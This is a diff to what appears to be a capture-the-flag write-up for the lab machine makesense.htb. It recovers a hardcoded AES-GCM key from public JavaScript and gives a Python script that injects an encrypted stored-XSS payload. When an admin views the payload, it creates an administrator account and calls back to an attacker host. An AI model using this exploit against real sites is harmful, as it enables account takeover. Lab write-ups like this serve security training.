@@ -157,7 +157,9 @@ echo '<IPAddress>    fqbSrJhU.makesense.htb' | sudo tee -a /etc/hosts
 
 Navigating to the Contact Submissions section in the WordPress admin panel, we can see voice recording files submitted by users. To understand how these files are uploaded, we intercept the traffic with Burp Suite while browsing to the subdomain fqbsrjhu.makesense.htb.
 In the page source, we find an inline JavaScript block that exposes the AJAX endpoint and a valid nonce:
+
 ```
+curl -sk https://fqbSrJhU.makesense.htb | grep -A5 webagency_ajax
 <script id="whisper-wrapper-js-extra">
 var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"50fbeb8031","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};
 //# sourceURL=whisper-wrapper-js-extra
@@ -208,9 +210,140 @@ When we upload the file, the post_id is 77 but the media ID after the upload is 
 From Contact Submissions section in the admin panel, as jake, we can't do much. Just listing the submitted files and waiting for an admin to approve.
 There's should be a way to trigger the admin role to submit the file. 
 
+main.js
+```
+           // Step 4: Encrypt payload
+            $('#processingStatus').text('Securing data...');
+            const payload = { transcription, summary };
+            const encryptedPayload = await window.whisperTranscriber.encryptPayload(payload);
+            console.log('[Phase 2] Payload encrypted');
 
+            // Step 5: Send to backend
+            $('#processingStatus').text('Saving results...');
 
+            const formData = new FormData();
+            formData.append('action', 'save_voice_results');
+            formData.append('nonce', webagency_ajax.nonce);
+            formData.append('post_id', postId);
+            formData.append('encrypted_payload', encryptedPayload);
 
+            const response = await $.ajax({
+                url: webagency_ajax.ajax_url,
+                type: 'POST',
+                data: formData,
+                processData: false,
+                contentType: false
+            }
+```
+From the main.js file we also find the save_voice_results action, but the payload as to be encrypted. 
+In the https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js we found the key.
+```
+// Symmetric encryption key (must match server-side)
+const ENCRYPTION_KEY = 'bL*******************************rI';
+```
+We looked into whisper-wrapper.js because of: 
+```
+jQuery(document).ready(function ($) {
+    // Initialize Whisper.cpp for client-side transcription
+    let whisperReady = false;
+    let whisperInitPromise = null;
+    let modelDownloadProgress = 0;
+
+    // Wait for whisperTranscriber to be available
+    async function waitForWhisper() {
+        let attempts = 0;
+        while (typeof window.whisperTranscriber === 'undefined' && attempts < 50) {
+            await new Promise(resolve => setTimeout(resolve, 100));
+            attempts++;
+        }
+        if (typeof window.whisperTranscriber === 'undefined') {
+            throw new Error('whisperTranscriber not loaded');
+        }
+    }
+```
+at the head of main.js.
+
+The normal workflow is as follows:  
+1. The user records a voice message on the subdomain.  
+2. The client-side JavaScript transcribes the audio using Whisper, producing the transcription.  
+3. The JavaScript encrypts the JSON object `{transcription, summary}` using AES-GCM with a hardcoded key.  
+4. The encrypted payload (Base64-encoded) is sent to the `save_voice_results` AJAX endpoint.  
+5. The server decrypts the payload, extracts the transcription and summary, and stores them in the corresponding team member post.  
+6. When an administrator reviews the submission in the WordPress admin panel, the stored transcription is rendered and displayed.  
+
+Now let's build a simple python script that puts everything together:
+
+```
+import json, base64, os, requests, urllib3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+
+urllib3.disable_warnings()
+
+NONCE = 'currentnonce'
+TARGET = 'https://makesense.htb/wp-admin/admin-ajax.php'
+LHOST = '<attackerIP>'
+
+r1 = requests.post(TARGET,
+    files={
+        'action': (None, 'save_voice_raw'),
+        'nonce':  (None, NONCE),
+        'voice_recording': ('dummy.wav', open('voice-message.wav','rb'), 'audio/wav')
+    },
+    verify=False)
+print('[*] save_voice_raw:', r1.text)
+post_id = r1.json()['data']['post_id']
+print('[*] post_id:', post_id)
+
+key_password = 'bLs****************************3rI'
+digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+digest.update(key_password.encode())
+key = digest.finalize()
+
+payload = {
+    "transcription": """<script>
+fetch('/wp-admin/user-new.php')
+.then(r=>r.text())
+.then(html=>{
+    const nonce = html.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];
+    return fetch('/wp-admin/user-new.php', {
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'},
+        body:'action=createuser&_wpnonce_create-user='+nonce+'&user_login=hacker&email=hacker@hacker.com&pass1=Hacker123!&pass2=Hacker123!&role=administrator&pw_weak=true'
+    });
+})
+.then(r=>fetch('http://""" + LHOST + """:8000/?done='+r.status));
+</script>""",
+    "summary": "test"
+}
+
+data = json.dumps(payload).encode()
+iv = os.urandom(12)
+encrypted = AESGCM(key).encrypt(iv, data, None)
+encrypted_payload = base64.b64encode(iv + encrypted).decode()
+
+r2 = requests.post(TARGET,
+    data={
+        'action': 'save_voice_results',
+        'nonce': NONCE,
+        'post_id': post_id,
+        'encrypted_payload': encrypted_payload
+    },
+    verify=False)
+print('[*] save_voice_results:', r2.text)
+
+```
+
+Why our attack works:
+
+The AES-GCM key is hardcoded in the public JavaScript served by the subdomain, meaning anyone can obtain it. This allows us to:
+
+1. Create our own JSON object containing an XSS payload instead of a legitimate transcription.
+2. Encrypt it using the same AES-GCM key.
+3. Send the encrypted payload to the `save_voice_results` endpoint.
+
+Since the payload is encrypted with the correct key, the server successfully decrypts it and treats it as a legitimate transcription, storing the embedded `<script>...</script>` payload without detecting that it was crafted by an attacker.
 
 
 
